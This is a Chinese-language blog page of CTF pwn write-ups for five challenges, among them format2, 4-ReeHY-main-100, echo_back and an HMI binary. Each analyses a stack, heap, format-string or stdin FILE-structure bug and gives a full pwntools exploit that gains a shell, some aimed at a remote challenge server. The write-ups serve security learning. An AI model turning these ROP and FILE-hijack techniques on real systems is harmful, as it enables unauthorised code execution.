<h3 id="25-format2"><a href="#25-format2" class="headerlink" title="25. format2"></a>25. format2</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230182624714.png" alt="image-20201230182624714"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230182747036.png" alt="image-20201230182747036"></p>
<h4 id="代码分析-20"><a href="#代码分析-20" class="headerlink" title="代码分析"></a>代码分析</h4><p>存在后门函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230183308602.png" alt="image-20201230183308602"></p>
<p>而整个程序的流程是将我们输入的字符串进行BASE64解密后，再调用auth函数验证，成功就执行shell。</p>
<p>auth存在一个栈溢出漏洞。v4是int类型有八个字节，而我们的输入最多到12个字节，也就是说我们可以覆盖到ebp。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230183424923.png" alt="image-20201230183424923"></p>
<h4 id="思路及利用-19"><a href="#思路及利用-19" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>上述分析可知，我们现在可以覆盖auth函数的ebp。</p>
<p>假设我们修改了ebp的内容为xxxx，且这个xxxx能被正常访问，那么auth函数执行完成后，回到main函数的ebp就指向了xxxx。</p>
<p>当main函数结束时，执行leave，retn指令。相当于：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov esp,ebp </span><br><span class="line">pop ebp <span class="comment">//ebp = &amp;xxxx</span></span><br><span class="line">pop rip <span class="comment">//rip = &amp;(xxxx)+4</span></span><br></pre></td></tr></table></figure>

<p>也就是说，如果输入的input为aaaabbbbcccc，将cccc置为input的地址，那么就可以执行bbbb指向的内容。</p>
<p>此，我们把bbbb改成我们的getshell的地址,把cccc改成input_addr，那么我们就能get shell。</p>
<p>接下来就是确定getshell盒4和input的地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185552349.png" alt="image-20201230185552349"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185625780.png" alt="image-20201230185625780"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line">  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">p = process(<span class="string">&#x27;./format2&#x27;</span>)  </span><br><span class="line"><span class="comment">#p = remote(&#x27;220.249.52.134&#x27;,31403)  </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./format2&#x27;</span>)  </span><br><span class="line">input_addr = <span class="number">0x811eb40</span></span><br><span class="line">getshell_addr = <span class="number">0x8049284</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Authenticate :&#x27;</span>)  </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(getshell_addr) + p32(input_addr)  </span><br><span class="line">p.sendline(base64.b64encode(payload))  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201230185951134.png" alt="image-20201230185951134"></p>
<h3 id="26-4-ReeHY-main-100"><a href="#26-4-ReeHY-main-100" class="headerlink" title="26. 4-ReeHY-main-100"></a>26. 4-ReeHY-main-100</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109161724396.png" alt="image-20210109161724396"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109161752268.png" alt="image-20210109161752268"></p>
<h4 id="代码分析-21"><a href="#代码分析-21" class="headerlink" title="代码分析"></a>代码分析</h4><p>首先这是一道堆的菜单题，但是发现由很多漏洞。</p>
<p>首先add函数，size是有符号的，但调用输入函数是传入的参数是无符号的。所以存在整数溢出从而导致了栈溢出。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109163245339.png" alt="image-20210109163245339"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109163423023.png" alt="image-20210109163423023"></p>
<p>删除函数中存在UAF漏洞</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109163540327.png" alt="image-20210109163540327"></p>
<h4 id="思路及利用-20"><a href="#思路及利用-20" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>这道题目既可以用整数溢出后的栈溢出，也可以用unlink。</p>
<p>这里记录栈溢出的方式，在size时输入-1，那么输出buf时就可以溢出，然后就是基础的栈溢出漏洞利用，先泄露地址再获得shell。</p>
<p>编写exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./4-ReeHY-main&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">51050</span>)</span><br><span class="line">a = ELF(<span class="string">&#x27;./4-ReeHY-main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./ctflibc.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,index,string</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;peanuts&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input size\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input cun\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input content\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(string))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delte</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Chose one to dele\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,string</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Chose one to edit\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the content\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(string))</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0400da3</span> </span><br><span class="line">pop_rsi_r15 = <span class="number">0x400da1</span></span><br><span class="line">put_got = <span class="number">0x602020</span></span><br><span class="line">put_plt = <span class="number">0x4006D0</span></span><br><span class="line">create(<span class="number">-1</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">128</span>+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(put_got)+p64(put_plt)+p64(<span class="number">0x0400C8C</span>))</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">create(<span class="number">-1</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">128</span>+p64(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x45216</span>+libc_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109164650267.png" alt="image-20210109164650267"></p>
<h2 id="六分题"><a href="#六分题" class="headerlink" title="六分题"></a>六分题</h2><h3 id="27-echo-back"><a href="#27-echo-back" class="headerlink" title="27. echo_back"></a>27. echo_back</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109162414667.png" alt="image-20210109162414667"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109164711467.png" alt="image-20210109164711467"></p>
<h4 id="代码分析-22"><a href="#代码分析-22" class="headerlink" title="代码分析"></a>代码分析</h4><p>存在格式化字符串漏洞，但是格式化字符串长度有限制。因此格式化字符串就做不到任意地址写了。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109165943354.png" alt="image-20210109165943354"></p>
<h4 id="思路及利用-21"><a href="#思路及利用-21" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>整个程序就只有一个格式化字符串漏洞，但是对输入进行了限制无论是setname还是echo back都只能输入7字符，构造的payload无论如何都是比7大的。所以需要新的知识。</p>
<p>利用printf漏洞先去攻击scanf内部结构，然后我们就可以直接利用scanf往目标处输入数据.</p>
<p>scanf是从stdin中读取数据的，如果我们能够修改它，就能实现任意内存写入。而stdin是一个FILE (_IO_FILE) 结构体指针。</p>
<p>结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic </span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments. </span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span>  </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_read_ptr;   <span class="comment">/* Current read pointer */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_read_end;   <span class="comment">/* End of get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_read_base;  <span class="comment">/* Start of putback+get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_write_base; <span class="comment">/* Start of put area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_write_ptr;  <span class="comment">/* Current put pointer. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_write_end;  <span class="comment">/* End of put area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_buf_base;   <span class="comment">/* Start of reserve area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_buf_end;    <span class="comment">/* End of reserve area. */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span>  </span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> _fileno;  </span><br><span class="line">  <span class="keyword">int</span> _flags2;  </span><br><span class="line">  <span class="keyword">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span>  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span>  </span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;  </span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;  </span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];  </span><br><span class="line">  </span><br><span class="line">  _IO_lock_t *_lock;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE  </span></span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure>

<p>再看scanf（省略很多）的实现，可以知道scanf函数主要通过调用<code>__vfscanf_internal</code>函数，从标准输入<code>stdin</code>读取数据。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __isoc99_scanf (<span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  done = __vfscanf_internal(<span class="built_in">stdin</span>, format, arg, SCANF_ISOC99_A);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在调用的过程中会做一些检查，其中关键的是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123; </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 判断fp的当前读取的位置是否超出了读取缓冲区</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="comment">// 返回fp的_IO_read_ptr作为用于写数据的位置</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;  </span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 对fp进行赋值操作，统一为_IO_buf_base</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 向_IO_buf_base写入数据，长度是_IO_buf_end - _IO_buf_base</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">                       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要是我们能够修改_IO_buf_base和_IO_buf_end 那么我们就可以实现任意位置无限制长度的写数据。</p>
<p>我们首先需要定位到*<strong>*_IO_2_1_stdin_**</strong>结构体在内存中的位置，然后再定位到*<strong>*_IO_buf_base**</strong> 的位置，_IO_buf_base位于结构体中的第8个，所以，它的_IO_buf_base_addr = _IO_buf_base + 0x8 * 7</p>
<p>首先查找_IO_buf_base的值。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109171752812.png" alt="image-20210109171752812"></p>
<p>可以得到<code>_IO_buf_base</code>和<code>_IO_buf_end</code>分别位于<code>_IO_2_1_stdin_</code>结构体的第8和第9位。其中<code>_IO_buf_base</code>的值为0x7ffff7dcda83是<code>_IO_2_1_stdin_+0x83</code>，可得<code>_IO_2_1_stdin</code>的地址是0x7ffff7dcda00。若将<code>_IO_buf_base</code>的最低字节覆盖为0，变成0x7ffff7dcda80，即为<code>_IO_2_1_stdin_+0x20</code>，即是<code>_IO_write_base</code>的地址。<br>利用printf的格式化字符串攻击就可以将0写入到<code>_IO_buf_base</code>的最低字节，从而可以利用scanf的IO漏洞进一步覆盖<code>_IO_buf_base</code>和<code>_IO_buf_end</code>从而向任意内存位置写入任意数据。</p>
<p>因此思路为：</p>
<ol>
<li>格式化字符串获得libc的基地址main函数的返回地址</li>
<li>利用格式化字符串把_IO_buf_base的最低一个byte置为\x00</li>
<li> 把IO_write_base,IO_write_ptr和IO_write_end的值写回去（IO_2_1_stdin+0x83），然后 把IO_buf_base和_IO_buf_end覆盖为main的返回地址和main的返回地址+0x18</li>
<li>使用scanf写入ROP</li>
</ol>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">   </span><br><span class="line">libcpath = <span class="string">&#x27;./libc.so.6&#x27;</span>  </span><br><span class="line">sh = process(<span class="string">&#x27;./echo_back&#x27;</span>)  </span><br><span class="line"><span class="comment"># sh = remote(&#x27;220.249.52.134&#x27;,36599)  </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./echo_back&#x27;</span>)  </span><br><span class="line">libc = ELF(libcpath)  </span><br><span class="line"><span class="comment">#main在elf中的静态地址  </span></span><br><span class="line">main_s_addr = <span class="number">0xC6C</span>  </span><br><span class="line"><span class="comment">#pop rdi  </span></span><br><span class="line"><span class="comment">#retn  </span></span><br><span class="line"><span class="comment">#在elf中的静态地址  </span></span><br><span class="line">pop_s_rdi = <span class="number">0xD93</span>  </span><br><span class="line">   </span><br><span class="line">_IO_2_1_stdin_ = libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]  </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echoback</span>(<span class="params">content</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>,<span class="string">&#x27;7&#x27;</span>)  </span><br><span class="line">   sh.send(content)  </span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setName</span>(<span class="params">name</span>):</span>  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   sh.sendafter(<span class="string">&#x27;name:&#x27;</span>,name)  </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">echoback(<span class="string">&#x27;%19$p&#x27;</span>)  </span><br><span class="line">   </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line"><span class="comment">#泄露__libc_start_main的地址  </span></span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>) - <span class="number">0xF0</span>  </span><br><span class="line"><span class="comment">#得到libc加载的基地址  </span></span><br><span class="line">libc_base = __libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]  </span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()  </span><br><span class="line">_IO_2_1_stdin_addr = libc_base + _IO_2_1_stdin_  </span><br><span class="line">_IO_buf_base = _IO_2_1_stdin_addr + <span class="number">0x8</span> * <span class="number">7</span>  </span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;iobase=&#x27;</span>,<span class="built_in">hex</span>(_IO_buf_base)  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#泄露main的地址  </span></span><br><span class="line">echoback(<span class="string">&#x27;%13$p&#x27;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line">main_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>) - <span class="number">0x9C</span>  </span><br><span class="line">elf_base = main_addr - main_s_addr  </span><br><span class="line">pop_rdi = elf_base + pop_s_rdi  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;elf base=&#x27;</span>,<span class="built_in">hex</span>(pop_rdi)  </span><br><span class="line">   </span><br><span class="line">echoback(<span class="string">&#x27;%12$p&#x27;</span>)  </span><br><span class="line">sh.recvuntil(<span class="string">&#x27;0x&#x27;</span>)  </span><br><span class="line"><span class="comment">#泄露main的ebp的值  </span></span><br><span class="line">main_ebp = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;-&#x27;</span>).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">0</span>],<span class="number">16</span>)  </span><br><span class="line"><span class="comment">#泄露存放(main返回地址)的地址  </span></span><br><span class="line">main_ret = main_ebp + <span class="number">0x8</span>  </span><br><span class="line">   </span><br><span class="line">setName(p64(_IO_buf_base))  </span><br><span class="line"><span class="comment">#覆盖_IO_buf_base的低1字节为0  </span></span><br><span class="line">echoback(<span class="string">&#x27;%16$hhn&#x27;</span>)  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#修改_IO_2_1_stdin_结构体  </span></span><br><span class="line">payload = p64(<span class="number">0x83</span> + _IO_2_1_stdin_addr)*<span class="number">3</span> + p64(main_ret) + p64(main_ret + <span class="number">0x8</span> * <span class="number">3</span>)  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">sh.sendafter(<span class="string">&#x27;length:&#x27;</span>,payload)  </span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line"><span class="comment">#不断调用getchar()使fp-&gt;_IO_read_ptr与使fp-&gt;_IO_read_end相等  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(payload)<span class="number">-1</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;length:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#对目标写入ROP  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">payload = p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)  </span><br><span class="line">sh.sendafter(<span class="string">&#x27;length:&#x27;</span>,payload)  </span><br><span class="line"><span class="comment">#这个换行最好单独发送  </span></span><br><span class="line">sh.sendline(<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line"><span class="comment">#getshell  </span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">   </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>

<h3 id="28-HMI流水灯运行"><a href="#28-HMI流水灯运行" class="headerlink" title="28. HMI流水灯运行"></a>28. HMI流水灯运行</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109173418628.png" alt="image-20210109173418628"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109173447352.png" alt="image-20210109173447352"></p>
<h4 id="代码分析-23"><a href="#代码分析-23" class="headerlink" title="代码分析"></a>代码分析</h4><p>发现一个栈溢出</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109173726167.png" alt="image-20210109173726167"></p>
<p>可以看出来在 i 等于 2 时，会将 SIGALRM 信号设置为 handler 函数(一个关于这两个 for 函数的死循环)</p>
<p>然后设置 alarm(2u) 使得 2 秒后程序接收到 SIGALRM 信号，然后执行 handler 函数的内容</p>
<p>但是在这 2 秒内，程序已经运行到了底下的 gee 函数内。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109173941838.png" alt="image-20210109173941838"></p>
<h4 id="思路及利用-22"><a href="#思路及利用-22" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>在 i 等于 2 时，如果利用 rop 把 alarm 的秒数改为 0，就可以取消掉 alarm。然后就是基础的rop操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>, <span class="number">32685</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc_32.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./format&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">plt_alarm = elf.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">plt_puts = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_puts = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">addr_main = <span class="number">0x80488AD</span></span><br><span class="line">addr_ebp_ret = <span class="number">0x08048bbb</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Initialization the program\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 1 finished&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 2 finished&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 3 finished&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x1b\x5b\x31\x41\x1b\x5b\x4b\x0a\x0a&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 4 finished&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8c</span></span><br><span class="line">payload += p32(plt_alarm)</span><br><span class="line">payload += p32(addr_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(plt_puts)</span><br><span class="line">payload += p32(addr_main)</span><br><span class="line">payload += p32(got_puts)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">addr_puts = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libcbase = addr_puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">addr_system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">addr_bin_sh = libcbase + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">success(<span class="string">&#x27;addr_puts   = &#x27;</span> + <span class="built_in">hex</span>(addr_puts))</span><br><span class="line">success(<span class="string">&#x27;addr_system = &#x27;</span> + <span class="built_in">hex</span>(addr_system))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Initialization the program\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 1 finished&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 2 finished&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;*...........................................................&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 3 finished&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x1b\x5b\x31\x41\x1b\x5b\x4b\x0a\x0a&#x27;</span>)</span><br><span class="line">info(<span class="string">&#x27;step 4 finished&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8c</span></span><br><span class="line">payload += p32(plt_alarm)</span><br><span class="line">payload += p32(addr_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(addr_system)</span><br><span class="line">payload += p32(addr_main)</span><br><span class="line">payload += p32(addr_bin_sh)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109174633572.png" alt="image-20210109174633572"></p>
<h3 id="29-easyfmt"><a href="#29-easyfmt" class="headerlink" title="29. easyfmt"></a>29. easyfmt</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109175124057.png" alt="image-20210109175124057"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210109175145182.png" alt="image-20210109175145182"></p>
<h4 id="代码分析-24"><a href="#代码分析-24" class="headerlink" title="代码分析"></a>代码分析</h4><p>显然存在格式化字符串漏洞。</p>
